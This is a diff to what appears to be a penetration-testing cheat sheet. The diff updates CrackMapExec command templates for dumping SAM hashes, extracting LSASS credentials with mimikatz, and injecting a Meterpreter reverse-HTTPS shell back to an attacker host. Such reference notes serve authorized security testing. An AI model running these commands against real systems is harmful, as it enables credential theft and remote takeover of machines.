@@ -926,21 +926,22 @@ crackmapexec --list-modules
 
 ```
 # SAM
-crackmapexec <TARGETS> --sam (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
+crackmapexec smb <TARGET | TARGETS> --sam (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
 
 # LSASS dump
-crackmapexec <TARGETS> -M mimikatz (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
+crackmapexec smb <TARGET | TARGETS> -M mimikatz (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
 
 # Meterpreter
 # msf > use multi/handler
 # msf exploit(handler) > set payload windows/meterpreter/reverse_https
-crackmapexec <TARGETS> -M metinject -o LHOST=<HOST> LPORT=<PORT> -d <DOMAIN> -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
+crackmapexec smb <TARGET | TARGETS> -M metinject -o LHOST=<HOST> LPORT=<PORT> -d <DOMAIN> -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
 ```
 
 Note that:
 
   - The `--lsa` option dumps LSA secrets which can't be used in `Pass-the-Hash`
-  attack and are harder to crack.
+    attack and are harder to crack. For more information, refer to the
+    `[Windows] Post exploitation` note.
   - The `<TARGET>` and `<MODULE>` should be specified before the credentials as
     a `CrackMapExec` bug could skip the targets / module otherwise.
   - If the targeted host is unreachable, `CrackMapExec` may exit with out
